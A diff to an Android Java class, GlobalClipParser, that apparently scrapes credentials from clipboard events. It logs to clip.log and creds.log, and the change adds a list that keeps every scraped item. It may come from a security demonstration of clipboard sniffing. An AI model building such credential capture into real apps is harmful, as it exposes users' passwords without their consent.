@@ -62,6 +62,7 @@ public class GlobalClipParser{
     public static final String CLIPLOG_FILENAME = "clip.log";
     public static final String CREDLOG_FILENAME = "creds.log";
     public static final List<String> mClips = new ArrayList<String>();
+    public static final List<ScrapedData> mData = new ArrayList<ScrapedData>();
 
     public static void onClipEvent(final Context context, ClipboardManager manager){
         Log.d("ClipCaster", "" + System.currentTimeMillis());
@@ -136,10 +137,14 @@ public class GlobalClipParser{
 
         @Override
         public void handleData(ScrapedData scrapedData) {
-            if(scrapedData != null && scrapedData.creds != null) {
-                ScrapedCredentials credentials = scrapedData.creds;
-                postNotification(credentials);
-                onCredDebug(mContext, credentials);
+            if(scrapedData != null) {
+                mData.add(scrapedData);
+                if(scrapedData.creds != null) {
+                    ScrapedCredentials credentials = scrapedData.creds;
+                    postNotification(credentials);
+
+                    onCredDebug(mContext, credentials);
+                }
             }
         }
 
